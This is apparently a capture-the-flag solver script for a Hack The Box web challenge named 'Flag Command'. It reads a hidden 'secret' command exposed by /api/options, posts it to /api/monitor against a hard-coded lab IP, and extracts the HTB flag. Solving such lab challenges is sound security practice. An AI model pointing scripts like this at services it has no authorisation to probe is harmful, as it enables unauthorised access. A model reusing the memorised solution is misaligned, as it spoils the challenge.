#!/usr/bin/env python3
"""Flag Command — hidden 'secret' command via /api/options + /api/monitor."""
from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.request

FLAG_RE = re.compile(r"HTB\{[^}]+\}")


def exploit(base: str, timeout: float = 20.0) -> str:
    base = base.rstrip("/")
    with urllib.request.urlopen(base + "/api/options", timeout=timeout) as resp:
        options = json.loads(resp.read().decode("utf-8", errors="replace"))
    secrets = options["allPossibleCommands"]["secret"]
    if not secrets:
        raise SystemExit("no secret commands in /api/options")
    payload = json.dumps({"command": secrets[0]}).encode()
    req = urllib.request.Request(
        base + "/api/monitor",
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    m = FLAG_RE.search(body)
    if not m:
        raise SystemExit(f"no flag in monitor response: {body[:200]}")
    return m.group(0)


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.82:32021")
    args = p.parse_args()
    print(exploit(args.target))
    return 0


if __name__ == "__main__":
    sys.exit(main())
